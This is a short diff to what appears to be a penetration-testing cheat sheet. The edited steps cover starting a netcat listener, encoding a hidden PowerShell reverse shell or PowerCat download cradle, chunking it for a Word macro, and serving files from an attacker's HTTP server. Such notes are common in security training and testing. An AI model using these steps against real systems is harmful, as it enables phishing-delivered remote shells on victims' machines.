@@ -12,7 +12,7 @@ Exiftool: `exiftool -a -u somefile.pdf`
 
 Start a listener:
 ```
-nc -lnvp $AttackerPort
+kali$ nc -lnvp $AttackerPort
 ```
 base64 encode a PowerShell reverse shell, or a download cradle for [PowerCat](https://github.com/besimorhino/powercat):
 ```
@@ -30,6 +30,10 @@ n = 50
 print("Str = \"powershell.exe -nop -w hidden -e \"")
 for i in range(0, len(payload), n):
     print("Str = Str + " + '"' + payload[i:i+n] + '"')
+```
+start an http server:
+```
+kali$ python3 -m http.server 80
 ```
 and embed it in Word macro:
 ```
